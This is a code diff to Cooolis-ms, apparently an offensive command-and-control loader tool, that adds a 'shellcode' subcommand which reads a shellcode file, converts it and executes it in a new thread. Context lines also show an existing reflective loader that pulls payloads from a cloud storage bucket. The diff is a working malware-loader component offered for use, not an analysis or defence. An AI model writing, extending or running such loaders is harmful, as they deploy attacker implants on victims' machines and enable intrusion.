@@ -24,6 +24,7 @@ e.g.  Cooolis-ms-x86.exe reflective -b XXX.oss-cn-XXX.aliyuncs.com -u /reflectiv
 #include "Cooolis-ExternalC2.h"
 #include "Cooolis-Reflective.h"
 #include "Cooolis-Http.h"
+#include "Cooolis-Shellcode.h"
 #include "rang.hpp"
 #include "CLI11.hpp"
 #include <codecvt> 
@@ -37,6 +38,7 @@ int main(int argc, char** argv)
 	std::string reflective_oss_bucket = "";
 	std::string reflective_file = "";
 	std::string reflective_uri_file = "";
+	std::string shellcode_file = "";
 	DWORD dwReflectiveProcessId = NULL;
 	CLI::App app{ "Version v1.1.4" };
 
@@ -133,6 +135,25 @@ int main(int argc, char** argv)
 			delete CooolisHttp;
 		}
 		delete CooolisReflective;
+		return TRUE;
+	});
+
+
+	// [Shellcode]
+	auto shellcode = app.add_subcommand("shellcode", "Shellcode Loader");
+	shellcode->add_option("-f,--file", shellcode_file, "Shellcode Path")->check(CLI::ExistingFile);
+
+	shellcode->callback([&]() {
+		DWORD dwFileSize = 0;
+		CCooolisShellcode* CooolisShellcode = new CCooolisShellcode;
+
+		dwFileSize = CooolisShellcode->LoadeShellcodeFile(shellcode_file);
+		if (dwFileSize == 0) {
+			return FALSE;
+		}
+		CooolisShellcode->ConvertShellcodeByCHAR(dwFileSize);
+		CooolisShellcode->CreateThreadRun();
+		delete CooolisShellcode;
 		return TRUE;
 	});
 
